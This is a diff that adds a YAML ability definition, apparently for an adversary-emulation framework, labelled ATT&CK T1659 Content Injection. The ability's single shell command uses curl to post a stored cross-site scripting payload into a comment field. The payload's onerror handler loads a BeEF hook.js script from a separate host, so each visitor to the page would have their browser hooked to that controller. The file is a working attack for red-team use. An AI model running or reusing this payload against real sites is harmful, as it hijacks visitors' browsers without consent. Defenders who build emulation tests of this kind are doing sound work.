@@ -1,0 +1,34 @@
+- tactic: initial-access
+  technique_name: Content Injection
+  technique_id: T1659
+  name: Injection of stored XSS
+  description: Injection of stored XSS using BEEF
+  executors:
+  - name: sh
+    platform: linux
+    command: ' curl -k -X POST https://192.168.2.1/api/createpost -d ''comment=<img
+      src=x onerror=''\''''var script=document.createElement("script"); script.src="https://192.168.0.10:3000/hook.js";
+      document.body.appendChild(script);''\''''>'' -b #{cookie} -i
+
+      '
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 600
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - initial-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: f5ee815f-2e57-4e33-9e3a-053ee2ae0b4c
